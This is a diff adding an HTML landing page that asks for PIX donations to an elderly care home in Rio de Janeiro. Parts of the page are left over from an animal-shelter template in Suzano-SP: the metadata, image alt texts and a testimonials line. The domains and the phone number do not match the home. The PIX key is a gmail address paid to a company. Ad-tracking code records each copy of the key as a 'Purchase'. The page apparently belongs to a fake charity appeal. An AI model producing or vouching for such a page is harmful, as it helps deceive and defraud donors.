@@ -1,0 +1,673 @@
+<html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="format-detection" content="telephone=no">
+    <title>Casa Geriátrica São Mateus - Salvando Vidas com Amor</title>
+    
+    <!-- Meta Tags SEO -->
+    <meta name="description" content="Refúgio dedicado ao resgate de cães e gatos em Suzano-SP. Faça sua doação PIX e ajude a salvar vidas!">
+    <meta name="keywords" content="refúgio animais, doação cães, doação gatos, resgate animal, Suzano SP, PIX doação, adoção responsável">
+    <meta name="author" content="Refúgio da Tia Rê">
+    <meta name="robots" content="index, follow">
+    
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://casasaomateus.com/">
+    <meta property="og:title" content="Casa São Mateus- Cuidando de Vidas com Amor">
+    <meta property="og:description" content="Asilo com mais de 40 anos de dedicação!">
+    <meta property="og:image" content="https://refugiotiare.com/images/Banner3.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:locale" content="pt_BR">
+    
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://casasaomateus.com/">
+    <meta property="twitter:title" content="Casa São Mateus- Cuidando de Vidas com Amor">
+    <meta property="twitter:description" content="Refúgio com 14 anos de dedicação! Faça sua doação PIX!">
+    <meta property="twitter:image" content="https://refugiodatiare.com/images/Banner3.png">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="images/logosemfundo4.png">
+    <link rel="apple-touch-icon" href="images/logosemfundo4.png">
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://casasaomateus.com">
+    
+    <!-- Theme Color -->
+    <meta name="theme-color" content="#FF8B3D">
+    <link rel="stylesheet" href="css/style.css">
+    
+    <!-- Preload de imagens críticas -->
+    <link rel="preload" as="image" href="images/logosemfundo4.png" fetchpriority="high">
+    <link rel="preload" as="image" href="images/banner3.png" fetchpriority="high">
+    <link rel="preload" as="image" href="images/2novo.png" fetchpriority="high">
+    
+    <!-- Preload das imagens do carrossel de transformações -->
+    <link rel="preload" as="image" href="images/antes1.png">
+    <link rel="preload" as="image" href="images/depois1.png">
+    <link rel="preload" as="image" href="images/antes 2.png">
+    <link rel="preload" as="image" href="images/depois 2.png">
+    <link rel="preload" as="image" href="images/antes 3.png">
+    <link rel="preload" as="image" href="images/depois 3.png">
+    <link rel="preload" as="image" href="images/antes 4.png">
+    <link rel="preload" as="image" href="images/depois 4.png">
+    
+    <!-- Preload das imagens do carrossel de depoimentos -->
+    <link rel="preload" as="image" href="images/1.png">
+    <link rel="preload" as="image" href="images/2.png">
+    <link rel="preload" as="image" href="images/3.png">
+    <link rel="preload" as="image" href="images/4.png">
+    <link rel="preload" as="image" href="images/8.png">
+    <link rel="preload" as="image" href="images/9.png">
+    <link rel="preload" as="image" href="images/10.png">
+    
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
+    <link rel="dns-prefetch" href="https://fonts.gstatic.com">
+    
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <script src="https://connect.facebook.net/signals/config/2298066117298347?v=2.9.231&r=stable&domain=achei.chat&hme=dcbbef44c997927c5af260dbc0059090127dce285cd316734e66d01ffe06084e&ex_m=88%2C150%2C130%2C19%2C123%2C62%2C42%2C124%2C69%2C61%2C137%2C77%2C13%2C87%2C27%2C118%2C109%2C67%2C70%2C117%2C134%2C96%2C139%2C7%2C3%2C4%2C6%2C5%2C2%2C78%2C86%2C140%2C214%2C162%2C56%2C219%2C216%2C217%2C49%2C177%2C26%2C66%2C223%2C222%2C165%2C29%2C55%2C8%2C58%2C82%2C83%2C84%2C89%2C113%2C28%2C25%2C116%2C112%2C111%2C131%2C68%2C133%2C132%2C44%2C114%2C54%2C106%2C12%2C136%2C39%2C205%2C207%2C172%2C22%2C23%2C24%2C16%2C17%2C38%2C34%2C36%2C35%2C73%2C79%2C81%2C94%2C122%2C125%2C40%2C95%2C20%2C18%2C100%2C63%2C32%2C127%2C126%2C128%2C119%2C21%2C31%2C53%2C93%2C135%2C64%2C15%2C30%2C187%2C158%2C265%2C203%2C148%2C190%2C183%2C91%2C115%2C72%2C104%2C48%2C41%2C102%2C103%2C108%2C52%2C14%2C110%2C101%2C59%2C43%2C97%2C47%2C50%2C46%2C85%2C138%2C0%2C107%2C11%2C105%2C9%2C1%2C51%2C80%2C57%2C129%2C60%2C99%2C76%2C75%2C45%2C120%2C74%2C71%2C65%2C98%2C90%2C37%2C121%2C33%2C92%2C10%2C141%2C229%2C228%2C230%2C235%2C236%2C237%2C233%2C225%2C164%2C166%2C201%2C224%2C226%2C267%2C204%2C151%2C195%2C179%2C252%2C254%2C196%2C255%2C256%2C253%2C213%2C170%2C160%2C264%2C145%2C157%2C168%2C152%2C185%2C159%2C215%2C142%2C173%2C193" async=""></script><script src="https://connect.facebook.net/signals/config/773462352029576?v=2.9.231&r=stable&domain=achei.chat&hme=dcbbef44c997927c5af260dbc0059090127dce285cd316734e66d01ffe06084e&ex_m=88%2C150%2C130%2C19%2C123%2C62%2C42%2C124%2C69%2C61%2C137%2C77%2C13%2C87%2C27%2C118%2C109%2C67%2C70%2C117%2C134%2C96%2C139%2C7%2C3%2C4%2C6%2C5%2C2%2C78%2C86%2C140%2C214%2C162%2C56%2C219%2C216%2C217%2C49%2C177%2C26%2C66%2C223%2C222%2C165%2C29%2C55%2C8%2C58%2C82%2C83%2C84%2C89%2C113%2C28%2C25%2C116%2C112%2C111%2C131%2C68%2C133%2C132%2C44%2C114%2C54%2C106%2C12%2C136%2C39%2C205%2C207%2C172%2C22%2C23%2C24%2C16%2C17%2C38%2C34%2C36%2C35%2C73%2C79%2C81%2C94%2C122%2C125%2C40%2C95%2C20%2C18%2C100%2C63%2C32%2C127%2C126%2C128%2C119%2C21%2C31%2C53%2C93%2C135%2C64%2C15%2C30%2C187%2C158%2C265%2C203%2C148%2C190%2C183%2C91%2C115%2C72%2C104%2C48%2C41%2C102%2C103%2C108%2C52%2C14%2C110%2C101%2C59%2C43%2C97%2C47%2C50%2C46%2C85%2C138%2C0%2C107%2C11%2C105%2C9%2C1%2C51%2C80%2C57%2C129%2C60%2C99%2C76%2C75%2C45%2C120%2C74%2C71%2C65%2C98%2C90%2C37%2C121%2C33%2C92%2C10%2C141" async=""></script><script async="" src="js/fbevents.js"></script><script async="" src="js/fbevents_1.js"></script><script>
+  window.pixelId = "689a83923bd06e5be08727e5";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel_1.js"></script><script async="" defer="" src="js/pixel.js"></script>
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+
+fbq('init', '806632008757472');
+fbq('track', 'PageView');
+
+// Espera o DOM carregar antes de adicionar o evento ao botão
+document.addEventListener('DOMContentLoaded', function() {
+  const copyBtn = document.getElementById('copy-pix');
+  const pixKey = document.getElementById('pixKey');
+
+  if (copyBtn && pixKey) {
+    copyBtn.addEventListener('click', function() {
+      const key = pixKey.textContent.trim();
+
+      // Copia a chave PIX
+      navigator.clipboard.writeText(key).then(() => {
+        // Envia o evento pro Meta Pixel
+        fbq('track', 'Purchase', {
+          value: 1.00,
+          currency: 'BRL'
+        });
+        console.log('Evento Purchase enviado');
+      }).catch(err => {
+        console.error('Erro ao copiar a chave PIX:', err);
+      });
+    });
+  }
+});
+</script>
+
+<noscript>
+  <img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=806632008757472&ev=PageView&noscript=1"/>
+</noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+</head><body>
+    <!-- Header com Logo Centralizada -->
+    <header class="main-header">
+        <div class="header-container">
+            <div class="header-logo">
+                <img src="images/logosemfundo4.png" alt="Logo Refúgio da Tia Rê" class="header-logo-img loaded" loading="eager" fetchpriority="high" decoding="sync">
+            </div>
+        </div>
+    </header>
+
+    <!-- Banner Principal -->
+    <section class="banner-section">
+        <div class="banner-container">
+            <img src="images/banner3.png" alt="Banner Refúgio da Tia Rê" class="banner-image loaded" loading="eager" fetchpriority="high" decoding="sync">
+        </div>
+    </section>
+
+    <main class="main-content">
+        <!-- Seção do Vídeo VSL -->
+        <section class="video-section">
+            <div class="container">
+                <div class="video-wrapper" style="max-width:900px;margin:0 auto;text-align:center;">
+                    <video id="vsl" controls autoplay playsinline preload="auto" style="width:100%;border-radius:12px;">
+                        <source src="vsl.mp4" type="video/mp4">
+                        Seu navegador não suporta vídeo HTML5.
+                    </video>
+                </div>
+            </div>
+        </section>
+        
+        
+        <!-- Botão Quero Ajudar após o vídeo -->
+        <div class="video-cta-container">
+            <button class="video-cta-btn" onclick="scrollToDonation()">
+                Quero Ajudar
+            </button>
+        </div>
+
+        <!-- Seção Quem Somos -->
+        <section class="about-section">
+            <div class="container">
+                <h2 class="section-title">Quem Somos?</h2>
+                <div class="about-content">
+                    <p>Fundada em 1983, a Casa Geriátrica São Mateus é um lar para idosos em Guadalupe, Rio de Janeiro.
+
+Hoje, sob a direção da Fundação Leopoldina e localizada na Rua Fernando Lobo, 879, ainda dependemos de doações para a manutenção do abrigo e o cuidado com nossos residentes. Sua ajuda é fundamental para que nossa missão continue.</p>
+                    
+                    <p>Hoje, o Refúgio da Terceira Idade é o lar de muitos, garantindo a todos um ambiente de carinho, respeito e paz..</p>
+                </div>
+                
+                <div class="stats-container">
+                    <div class="stat-item" style="opacity: 1; transform: translateY(0px);">
+                        <div class="stat-icon">
+                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12 2L13.09 8.26L20 9L13.09 9.74L12 16L10.91 9.74L4 9L10.91 8.26L12 2Z" fill="currentColor"></path>
+                                <path d="M19 15L20.09 18.26L23 19L20.09 19.74L19 23L17.91 19.74L15 19L17.91 18.26L19 15Z" fill="currentColor"></path>
+                                <path d="M5 15L6.09 18.26L9 19L6.09 19.74L5 23L3.91 19.74L1 19L3.91 18.26L5 15Z" fill="currentColor"></path>
+                            </svg>
+                        </div>
+                        <div class="stat-number">42</div>
+                        <div class="stat-label">Anos</div>
+                    </div>
+                    
+                    <div class="stat-item" style="opacity: 1; transform: translateY(0px);">
+                        <div class="stat-icon">
+                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12 2C13.1 2 14 2.9 14 4C14 5.1 13.1 6 12 6C10.9 6 10 5.1 10 4C10 2.9 10.9 2 12 2ZM21 9V7L15 7V9C15 11.8 12.8 14 10 14S5 11.8 5 9V7L3 7V9C3 12.9 6.1 16 10 16C13.9 16 17 12.9 17 9H21Z" fill="currentColor"></path>
+                                <path d="M7.5 18C8.3 18 9 18.7 9 19.5S8.3 21 7.5 21 6 20.3 6 19.5 6.7 18 7.5 18ZM16.5 18C17.3 18 18 18.7 18 19.5S17.3 21 16.5 21 15 20.3 15 19.5 15.7 18 16.5 18Z" fill="currentColor"></path>
+                            </svg>
+                        </div>
+                        <div class="stat-number">+100</div>
+                        <div class="stat-label">Idosos</div>
+                    </div>
+                    
+                   
+                    
+
+                    
+                    <!-- <div class="stat-item">
+                        <div class="stat-icon">
+                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12 2L15.09 8.26L22 9L17 14L18.18 21L12 17.77L5.82 21L7 14L2 9L8.91 8.26L12 2Z" fill="currentColor"/>
+                            </svg>
+                        </div>
+                        <div class="stat-number">1</div>
+                        <div class="stat-label">Haras</div>
+                    </div>
+                    
+                    <div class="stat-item">
+                        <div class="stat-icon">
+                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M10 20V14H14V20H19V12H22L12 3L2 12H5V20H10Z" fill="currentColor"/>
+                            </svg>
+                        </div>
+                        <div class="stat-number">2</div>
+                        <div class="stat-label">Abrigos</div>
+                    </div> -->
+                </div>
+            </div>
+        </section>
+
+        <!-- Seção Salve o Abrigo -->
+        <section class="save-shelter-section">
+            <div class="container">
+                <h2 class="section-title">Salve o Asilo</h2>
+                <div class="banner4-container">
+                    <img src="images/banner4.png" alt="Salve o Abrigo" class="banner4-image loaded" loading="lazy" decoding="async">
+                </div>
+                <div class="urgent-message">
+                    <p>Fazemos o impossível todos os dias para manter centenas de vidas protegidas.</p>
+                    <p class="highlight">Sua ajuda pode fazer toda a diferença!</p>
+                </div>
+                
+                <!-- Seção Impacto -->
+                <div class="impact-section">
+                    <h3>Impacto da sua doação:</h3>
+                    <div class="impact-grid">
+                        <div class="impact-item">
+                            <span class="impact-value">R$ 25</span>
+                            <span class="impact-description">Ajuda na compra de itens de higiene, como um sabonete e pasta de dente</span>
+                        </div>
+                        <div class="impact-item">
+                            <span class="impact-value">R$ 40</span>
+                            <span class="impact-description">Garante a compra de 1 kg de leite em pó, um alimento essencial na dieta dos idosos</span>
+                        </div>
+                        <div class="impact-item">
+                            <span class="impact-value">R$ 75</span>
+                            <span class="impact-description">Cobre 1 semana de fraldas geriátricas para um dos nossos moradores</span>
+                        </div>
+                        <div class="impact-item">
+                            <span class="impact-value">R$ 100</span>
+                            <span class="impact-description">Garante uma cesta básica para alimentar nossos moradores</span>
+                        </div>
+                        <div class="impact-item">
+                            <span class="impact-value">R$ 250</span>
+                            <span class="impact-description">Ajuda a custear sessões de fisioterapia e medicamentos dos idosos</span>
+                        </div>
+                        <div class="impact-item">
+                            <span class="impact-value">R$ 500</span>
+                            <span class="impact-description">Ajuda na compra de um cilindro de oxigênio para idosos com problemas respiratórios</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Seção Doação PIX -->
+        <section class="donation-section" id="como-doar-pix">
+            <div class="container">
+                <h2 class="section-title">Como Doar via PIX</h2>
+                <div class="pix-image">
+                    <img src="images/pixsaomateus3.png" alt="QR Code PIX" class="pix-qr loaded" loading="lazy" style="max-width: 300px; width: auto; height: auto; display: block; margin: 0px auto; object-fit: contain; object-position: center center; visibility: visible;">
+                </div>
+                <div class="pix-container">
+                    <div class="pix-instructions">
+                        <h3>Passos para doar:</h3>
+                        <ol>
+                            <li>Copie a chave PIX clicando no botão abaixo</li>
+                            <li>Abra o app do seu banco ou internet banking</li>
+                            <li>Escolha "PIX" e depois "Transferir" ou "Pagar"</li>
+                            <li>Cole a chave PIX no campo "Chave PIX" ou "Destinatário"</li>
+                            <li>Digite o valor que deseja doar</li>
+                            <li>Confirme os dados e finalize a transferência</li>
+                            <li>Pronto! Sua doação chegará instantaneamente</li>
+                        </ol>
+                    </div>
+                    <div class="pix-key-container">
+                        <div class="pix-key" id="pixKey">doesaomateus@gmail.com</div>
+                        <div class="pix-recipient">Recebedor: <strong>CASA GERIATRICA S MATEUS LTDA</strong></div>
+                        <button class="copy-btn" id="copy-pix"><span class="copy-icon">📋</span> Copiar Chave PIX</button>
+                    </div>
+
+                    <p class="donation-footer">Qualquer valor é bem-vindo. Sua contribuição faz toda a diferença na vida desses idosos!</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Seção Histórias de Transformação -->
+        <section class="transformation-section">
+            <div class="container">
+                <h2 class="section-title">Trabalhos do Asilo</h2>
+                <p class="transformation-subtitle">Esses são apenas alguns dos nossos trabalhos que conseguimos fazer graças ao apoio de pessoas como você.</p>
+                
+             <div class="transformation-carousel" id="transformationCarousel">
+    <div class="transformation-item" style="transition: 0.6s cubic-bezier(0.4, 0, 0.2, 1);">
+        <div class="transformation-card">
+            <div class="transformation-images">
+                <div class="before-after">
+                    <div class="image-container before" style="width:100%; display:flex; flex-direction:column; justify-content:center; align-items:center;">
+                        <img src="images/antes11.png" alt="Luna antes do resgate" loading="eager" decoding="async" style="display:block; max-width:100%; height:auto; margin:0; float:none;" class="loaded">
+                    </div>
+                    
+                </div>
+            </div>
+            <div class="transformation-content">
+                <h3>Cabelereira</h3>
+                <p>Com muito carinho e amor, conseguimos uma cabelereira profissional para nossos moradores.</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+                    <div class="transformation-item">
+                        <div class="transformation-card">
+                            <div class="transformation-images">
+                                <div class="before-after">
+                                    <div class="image-container before">
+                                        <img src="images/antes22.png" alt="Simba antes do resgate" loading="eager" decoding="async" class="loaded">
+                                    </div>
+                                    
+                                </div>
+                            </div>
+                            <div class="transformation-content">
+                                <h3>Carnaval</h3>
+                                <p>Com a ajuda dos moradores de guadalupe, e dos trabalhadores do Ceasa, conseguimos realizarosso dia do Carnaval!.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="transformation-item active">
+                        <div class="transformation-card">
+                            <div class="transformation-images">
+                                <div class="before-after">
+                                    
+                                    <div class="image-container after">
+                                        <img src="images/depois3.png" alt="Mel depois do resgate" loading="eager" decoding="async" class="loaded">
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="transformation-content">
+                                <h3>Páscoa</h3>
+                                <p>Nossa Páscoa contando com nossos irmãos da Igreja Santa Maria de Guadalupe.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="transformation-item">
+                        <div class="transformation-card">
+                            <div class="transformation-images">
+                                <div class="before-after">
+                                    <div class="image-container before">
+                                        <img src="images/antes4.png" alt="Thor antes do resgate" loading="eager" decoding="async" class="loaded">
+                                    </div>
+                                    
+                                </div>
+                            </div>
+                            <div class="transformation-content">
+                                <h3>Tarde de Pastel</h3>
+                                <p>No dia 09/08/2025 fizemos a nossa tarde de pastel para nossos moradores.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="transformation-controls">
+                    <button class="transformation-btn prev" onclick="prevTransformation()" id="bce8a60e-99c5-0c4f-6d6e-21312dc8022a">‹</button>
+                    <div class="transformation-indicators" id="transformationIndicators"><div class="transformation-indicator" aria-label="Ir para história 1" role="button" tabindex="0"></div><div class="transformation-indicator" aria-label="Ir para história 2" role="button" tabindex="0"></div><div class="transformation-indicator active" aria-label="Ir para história 3" role="button" tabindex="0"></div><div class="transformation-indicator" aria-label="Ir para história 4" role="button" tabindex="0"></div></div>
+                    <button class="transformation-btn next" onclick="nextTransformation()" id="8f37294a-17ed-d4d8-9dad-7b9dc8b0d0be">›</button>
+                </div>
+                
+                <div class="transformation-message">
+                    <button class="transformation-cta-btn" onclick="scrollToDonation()">
+                        Transformar Mais Vidas ✨
+                    </button>
+                </div>
+            
+        </section>
+
+        <!-- Seção Depoimentos -->
+        <section class="testimonials-section">
+            <div class="container">
+                <h2 class="section-title">Depoimentos</h2>
+                <p class="testimonials-subtitle">Histórias reais de pessoas que fazem parte da família Refúgio da Tia Rê</p>
+                
+                <div class="testimonials-carousel" id="testimonialsCarousel">
+                    <div class="testimonial-item active" style="opacity: 1; transform: translateY(0px);">
+                        <div class="testimonial-card">
+                                                    <div class="testimonial-image">
+                            <img src="images/1.png" alt="Depoimento 1" loading="eager" decoding="async" class="loaded">
+                        </div>
+                            <div class="testimonial-content">
+                                <h4>Ana Paula Medeiros</h4>
+                                <p>"Essa casa, apesar de simples, tem muito amor. As pessoas que trabalham fazem por amor, pois os recursos são escassos. Quem puder ajudar, pode ter certeza que estará fazendo uma grande caridade."</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="testimonial-item" style="opacity: 0; transform: translateY(30px);">
+                        <div class="testimonial-card">
+                            <div class="testimonial-image">
+                                <img src="images/2.png" alt="Depoimento 2" loading="eager" decoding="async" class="loaded">
+                            </div>
+                            <div class="testimonial-content">
+                                <h4>Mercedes Monteiro</h4>
+                                <p>"Boa noite!!! Há real necessidade de ajuda à Casa. A Diretora, Equipe de Enfermagem, Cuidadoras, são extremamente dedicados e precisam de ajuda para continuarem essa missão tão bonita e importante."</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="testimonial-item" style="opacity: 0; transform: translateY(30px);">
+                        <div class="testimonial-card">
+                            <div class="testimonial-image">
+                                <img src="images/3.png" alt="Depoimento 3" loading="eager" decoding="async" class="loaded">
+                            </div>
+                            <div class="testimonial-content">
+                                <h4>Erika Matos</h4>
+                                <p>"É  muito claro a forma cuidadosa como são  tratados e dá pra ver que a doações são realmente aplicadas e usadas com os idosos."</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="testimonial-item" style="opacity: 0; transform: translateY(30px);">
+                        <div class="testimonial-card">
+                            <div class="testimonial-image">
+                                <img src="images/4.png" alt="Depoimento 4" loading="eager" decoding="async" class="loaded">
+                            </div>
+                            <div class="testimonial-content">
+                                <h4>Tamires Espindola Gomes</h4>
+                                <p>"Eu ia visitar sempre quando eu era criança"</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="testimonial-item" style="opacity: 0; transform: translateY(30px);">
+                        <div class="testimonial-card">
+                            <div class="testimonial-image">
+                                <img src="images/8.png" alt="Depoimento 5" loading="eager" decoding="async" class="loaded">
+                            </div>
+                            <div class="testimonial-content">
+                                <h4>Ronia Renam Dos Santos</h4>
+                                <p>"as doações, os idosos agradecem a visita do papai noel foi o maximo"</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="testimonial-item" style="opacity: 0; transform: translateY(30px);">
+                        <div class="testimonial-card">
+                            <div class="testimonial-image">
+                                <img src="images/9.png" alt="Depoimento 6" loading="eager" decoding="async" class="loaded">
+                            </div>
+                            <div class="testimonial-content">
+                                <h4>Júlio Nascimento</h4>
+                                <p>"super recomendo, pessoas amáveis , amigas e profissionais"</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="testimonial-item" style="opacity: 0; transform: translateY(30px);">
+                        <div class="testimonial-card">
+                            <div class="testimonial-image">
+                                <img src="images/10.png" alt="Depoimento 7" loading="eager" decoding="async" class="loaded">
+                            </div>
+                            <div class="testimonial-content">
+                                <h4>Aziza Souza</h4>
+                                <p>"Trabalham com seriedade e transparência."</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="testimonial-controls">
+                    <button class="testimonial-btn prev" onclick="prevTestimonial()" id="cd8ba8fe-3e6b-cad4-3200-f3924aad8dfe">‹</button>
+                    <div class="testimonial-indicators" id="testimonialIndicators"><div class="testimonial-indicator active" aria-label="Ir para depoimento 1" role="button" tabindex="0"></div><div class="testimonial-indicator" aria-label="Ir para depoimento 2" role="button" tabindex="0"></div><div class="testimonial-indicator" aria-label="Ir para depoimento 3" role="button" tabindex="0"></div><div class="testimonial-indicator" aria-label="Ir para depoimento 4" role="button" tabindex="0"></div><div class="testimonial-indicator" aria-label="Ir para depoimento 5" role="button" tabindex="0"></div><div class="testimonial-indicator" aria-label="Ir para depoimento 6" role="button" tabindex="0"></div><div class="testimonial-indicator" aria-label="Ir para depoimento 7" role="button" tabindex="0"></div></div>
+                    <button class="testimonial-btn next" onclick="nextTestimonial()" id="5f534b2b-729b-e0bf-2e4d-5ef64c281d70">›</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- Seção Localização 
+        <section class="location-section">
+            <div class="container">
+                <h2 class="section-title">Nossa Localização</h2>
+                <p class="location-subtitle">Venha nos conhecer pessoalmente! Estamos sempre de portas abertas para receber visitantes e voluntários.</p>
+                
+                <div class="location-content">
+                    <div class="map-container">
+                        <div class="map-wrapper">
+                            <iframe 
+                                src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3658.4916578251896!2d-46.31234567890123!3d-23.5123456789!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x94ce63f5b3c6c7e5%3A0x1234567890abcdef!2sEstr.%20Piratininga%2C%201050%20-%20Est%C3%A2ncia%20Piratininga%2C%20Suzano%20-%20SP%2C%2008633-340%2C%20Brasil!5e0!3m2!1spt-BR!2sbr!4v1703123456789!5m2!1spt-BR!2sbr"
+                                width="100%" 
+                                height="400" 
+                                style="border:0;" 
+                                allowfullscreen="" 
+                                loading="lazy" 
+                                referrerpolicy="no-referrer-when-downgrade"
+                                title="Localização da Casa Geriátrica São Mateus-  Rua Fernando Lobo 879 - Guadalupe, Rio de Janeiro - RJ">
+                            </iframe>
+                            <div class="map-overlay">
+                                <div class="map-info">
+                                    <h4>📍 Refúgio da Tia Rê</h4>
+                                    <p> Rua Fernando Lobo 879 - Guadalupe, Rio de Janeiro - RJ</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="navigation-buttons">
+                            <a href="https://www.google.com/maps/dir//Estr.+Piratininga,+Estância+Piratininga,+Suzano+-+SP" 
+                               target="_blank" 
+                               class="nav-btn google-maps">
+                                <svg viewBox="0 0 24 24" class="nav-icon">
+                                    <path fill="currentColor" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+                                </svg>
+                                Abrir no Google Maps
+                            </a>
+                        </div>
+                    </div>
+
+                    <div class="location-info">
+                    </div>
+                </div>
+            </div>
+        </section> -->
+
+        <!-- Call to Action Final -->
+        <section class="cta-section">
+            <div class="container">
+                <h2>Faça Parte Desta História</h2>
+                <p>Cada doação, cada compartilhamento, cada gesto de amor faz a diferença na vida de centenas de idosos que dependem da nossa ajuda.</p>
+                <button class="cta-btn" onclick="scrollToDonation()">
+                    Quero Ajudar Agora ❤️
+                </button>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-logo">
+                    <img src="images/logosemfundo4.png" alt="Logo Refúgio da Tia Rê" class="loaded">
+                    <h3>Casa Geriátrica São Mateus</h3>
+                </div>
+                
+                <div class="footer-info">
+                                         <div class="footer-section" style="opacity: 1; transform: translateY(0px);">
+                         <h4>Contato</h4>
+                        <!-- <p>📍 Rua Fernando Lobo 879 - Guadalupe, Rio de Janeiro - RJ</p> -->
+                         <p>📱 WhatsApp: 11 97760-7010</p>
+                         <p>📧 <a href="mailto:doesaomateus@gmail.com" style="text-decoration: none;" id="00294d35-fac4-30ff-a669-1878bf05404d">doesaomateus@gmail.com</a></p>
+
+                     </div>
+                    
+                    <div class="footer-section" style="opacity: 1; transform: translateY(0px);">
+                        <h4>Redes Sociais</h4>
+                        <div class="social-links">
+                            <a href="https://www.facebook.com/profile.php?id=61578210721519" target="_blank" class="social-link" id="1a5cf1f7-fa9c-0af2-36e2-e9c466d9333f">📘 Facebook</a>
+                            <a href="https://www.instagram.com/casa_saomateus?utm_source=organic&utm_campaign=&utm_medium=&utm_content=&utm_term=" target="_blank" class="social-link" id="d24b178f-cc56-2ded-1204-daba8b7f242e">📷 Instagram</a>
+                            <a href="#" class="social-link tiktok-soon" id="81f54a99-573a-1800-933e-c63e8473d350">🎥 TikTok (em breve)</a>
+                        </div>
+                    </div>
+                    
+                   
+            
+            <div class="footer-bottom">
+                <p>© 2025 Casa Geriátrica São Mateus. Todos os direitos reservados.</p>
+                <p>Desenvolvido com ❤️ para salvar vidas</p>
+
+            </div>
+        </div>
+    </div></div></footer>
+
+
+
+    <!-- Botão WhatsApp Flutuante 
+    <div class="whatsapp-float" id="whatsappFloat">
+        <a href="https://wa.me/5511977607010?text=Ol%C3%A1!%20Gostaria%20de%20ajudar%20o%20Ref%C3%BAgio%20da%20Tia%20R%C3%AA%20%F0%9F%90%95%E2%9D%A4%EF%B8%8F" 
+           target="_blank" 
+           class="whatsapp-btn"
+           aria-label="Entrar em contato via WhatsApp">
+            <svg viewBox="0 0 24 24" class="whatsapp-icon">
